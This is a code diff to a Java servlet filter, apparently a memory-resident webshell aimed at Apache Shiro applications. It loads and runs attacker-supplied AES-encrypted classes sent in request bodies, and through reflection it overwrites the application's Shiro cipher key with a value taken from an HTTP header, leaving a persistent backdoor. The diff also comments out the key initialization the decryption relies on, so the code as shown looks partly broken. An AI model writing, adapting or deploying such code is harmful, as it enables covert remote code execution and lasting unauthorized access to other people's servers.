@@ -34,7 +34,7 @@ public class ChangeShiroKeyFilter extends ClassLoader implements Filter {
     public String cs = "UTF-8";
     public String Pwd = "FcoRsBKe9XB3zOHbxTG0Lw==";
     public String path = "/favicondemo.ico";
-    public byte[] key = java.util.Base64.getDecoder().decode(this.Pwd);
+//    public byte[] key = java.util.Base64.getDecoder().decode(this.Pwd);
     //    public byte[] shirokey = java.util.Base64.getDecoder().decode("3AvVhmFLUs0KTA3Kprsdag==");
 
     public ChangeShiroKeyFilter(){
@@ -58,7 +58,7 @@ public class ChangeShiroKeyFilter extends ClassLoader implements Filter {
         try {
             session.putValue("u", this.Pwd);
             Cipher c = Cipher.getInstance("AES");
-            c.init(2, new SecretKeySpec(this.key, "AES"));
+//            c.init(2, new SecretKeySpec(this.key, "AES"));
             (new ChangeShiroKeyFilter(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(req.getReader().readLine()))).newInstance().equals(obj);
         } catch (Exception var7) {
             var7.printStackTrace();
@@ -96,14 +96,14 @@ public class ChangeShiroKeyFilter extends ClassLoader implements Filter {
                 field.setAccessible(true);
                 obj = field.get(obj);
                 java.lang.reflect.Method setEncryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setEncryptionCipherKey", new Class[]{byte[].class});
-                byte[] bytes = this.base64Decode("FcoRsBKe9XB3zOHbxTG0Lw==");
+                byte[] bytes = this.base64Decode(this.Pwd);
                 setEncryptionCipherKey.invoke(obj, new Object[]{bytes});
                 java.lang.reflect.Method setDecryptionCipherKey = obj.getClass().getSuperclass().getDeclaredMethod("setDecryptionCipherKey", new Class[]{byte[].class});
                 setDecryptionCipherKey.invoke(obj, new Object[]{bytes});
             }
         }
 //        this.Mem();
-        return "Success";
+        return "change key ok";
     }
 
 
@@ -146,22 +146,14 @@ public class ChangeShiroKeyFilter extends ClassLoader implements Filter {
 
         return true;
     }
-    public static String md5(String s) {
-        String ret = null;
-        try {
-            MessageDigest m = MessageDigest.getInstance("MD5");
-            m.update(s.getBytes(), 0, s.length());
-            ret = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
-        } catch (Exception var3) {
-        }
-        return ret;
-    }
+
 
     public void parseObj(Object obj) {
         if (obj.getClass().isArray()) {
             Object[] data = (Object[])((Object[])obj);
             this.request = (HttpServletRequest)data[0];
             this.response = (HttpServletResponse)data[1];
+            this.Pwd = this.request.getHeader("p");
         } else {
             try {
                 Class clazz = Class.forName("javax.servlet.jsp.PageContext");
